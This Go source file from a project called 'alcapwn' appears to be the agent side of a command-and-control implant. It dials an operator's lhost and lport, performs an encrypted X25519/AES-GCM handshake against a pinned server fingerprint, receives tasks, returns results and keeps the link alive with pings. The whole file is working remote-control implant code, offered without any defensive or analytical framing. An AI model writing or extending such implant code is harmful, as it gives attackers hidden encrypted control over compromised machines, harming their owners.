package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync/atomic"
	"time"

	"alcapwn/proto"
)

// TCPTransport implements Transport over a persistent X25519+AES-256-GCM
// encrypted TCP connection.
//
// A background read goroutine decrypts incoming frames and forwards them to
// msgCh.  A background ping goroutine sends MsgPing every 30 seconds; the
// server echoes MsgPong to confirm the link is alive.
type TCPTransport struct {
	addr   string // host:port to dial
	fp     string // pinned server fingerprint (may be "")
	conn   net.Conn
	cs     *proto.CryptoSession
	msgCh  chan *proto.Envelope // read goroutine → PollTask
	errCh  chan error           // read goroutine → PollTask
	closed atomic.Bool
}

func newTCPTransport() *TCPTransport {
	return &TCPTransport{
		addr:  net.JoinHostPort(lhost, lport),
		fp:    serverFingerprint,
		msgCh: make(chan *proto.Envelope, 4),
		errCh: make(chan error, 1),
	}
}

// Connect dials the server, writes the ALCA routing tag so acceptLoop routes
// to handleAgentSession, performs the X25519 key exchange, and completes the
// Hello/Welcome handshake.
func (t *TCPTransport) Connect(hello proto.Hello) error {
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] TCP connecting to %s\n", t.addr)
	}
	conn, err := net.DialTimeout("tcp", t.addr, 10*time.Second)
	if err != nil {
		if isDebug() {
			fmt.Fprintf(os.Stderr, "[agent] dial failed: %v\n", err)
		}
		return err
	}
	t.conn = conn
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] connected, sending magic\n")
	}

	// 4-byte ALCA routing tag — must precede the crypto handshake.
	if _, err := conn.Write(proto.Magic[:]); err != nil {
		conn.Close()
		return fmt.Errorf("routing tag: %w", err)
	}
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] magic sent, starting crypto handshake\n")
	}

	cs, err := proto.NewClientCryptoSession(conn, t.fp)
	if err != nil {
		if isDebug() {
			fmt.Fprintf(os.Stderr, "[agent] crypto handshake failed: %v\n", err)
		}
		conn.Close()
		return fmt.Errorf("crypto handshake: %w", err)
	}
	t.cs = cs
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] crypto session established\n")
	}

	if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgHello, hello); err != nil {
		if isDebug() {
			fmt.Fprintf(os.Stderr, "[agent] hello send failed: %v\n", err)
		}
		conn.Close()
		return fmt.Errorf("hello: %w", err)
	}
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] hello sent, waiting for welcome\n")
	}

	env, err := proto.ReadMsgEncrypted(conn, cs)
	if err != nil {
		if isDebug() {
			fmt.Fprintf(os.Stderr, "[agent] welcome read failed: %v\n", err)
		}
		conn.Close()
		return fmt.Errorf("welcome: %w", err)
	}
	if env.Type != proto.MsgWelcome {
		conn.Close()
		return fmt.Errorf("expected welcome, got %s", env.Type)
	}
	if isDebug() {
		fmt.Fprintf(os.Stderr, "[agent] welcome received, session ready\n")
	}

	go t.readLoop()
	go t.pingLoop()
	return nil
}

// readLoop decrypts incoming frames and forwards them to msgCh.
func (t *TCPTransport) readLoop() {
	for {
		env, err := proto.ReadMsgEncrypted(t.conn, t.cs)
		if err != nil {
			if !t.closed.Load() {
				select {
				case t.errCh <- err:
				default:
				}
			}
			return
		}
		t.msgCh <- env
	}
}

// pingLoop sends MsgPing every 30 seconds.  Exits when the connection closes
// or the transport is marked closed.
func (t *TCPTransport) pingLoop() {
	tick := time.NewTicker(30 * time.Second)
	defer tick.Stop()
	for {
		<-tick.C
		if t.closed.Load() {
			return
		}
		if err := proto.WriteMsgEncrypted(t.conn, t.cs, proto.MsgPing, struct{}{}); err != nil {
			return
		}
	}
}

// PollTask blocks until a MsgTask arrives, discarding MsgPong responses.
func (t *TCPTransport) PollTask() (*proto.Task, error) {
	for {
		select {
		case err := <-t.errCh:
			return nil, err
		case env := <-t.msgCh:
			switch env.Type {
			case proto.MsgTask:
				var task proto.Task
				if err := json.Unmarshal(env.Data, &task); err != nil {
					return nil, fmt.Errorf("task decode: %w", err)
				}
				return &task, nil
			case proto.MsgPong:
				// heartbeat acknowledged — keep waiting
			}
		}
	}
}

// SendResult encrypts and writes a Result to the server.
func (t *TCPTransport) SendResult(result proto.Result) error {
	return proto.WriteMsgEncrypted(t.conn, t.cs, proto.MsgResult, result)
}

// Close marks the transport closed and shuts down the connection.
func (t *TCPTransport) Close() {
	t.closed.Store(true)
	if t.conn != nil {
		t.conn.Close()
	}
}
